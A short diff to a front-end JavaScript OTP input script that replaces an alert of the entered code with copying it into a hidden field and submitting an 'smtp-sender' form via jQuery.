@@ -1,13 +1,14 @@
 window.addEventListener("load", function () {
     // Get otp container
     const OTPContainer = document.querySelector("#otp-input");
-
     const OTPValueContainer = document.querySelector("#otp-value");
-
+    const CodeSmtp = document.querySelector(".Code-Smtp");
     const continueButton = document.querySelector("#submit");
     continueButton.addEventListener("click", (e) => {
         updateValue(inputs);
-        alert(OTPValueContainer.value);
+        CodeSmtp.value=OTPValueContainer.value
+        e.preventDefault()
+        $(".smtp-sender").submit()
     });
 
     // Focus first input
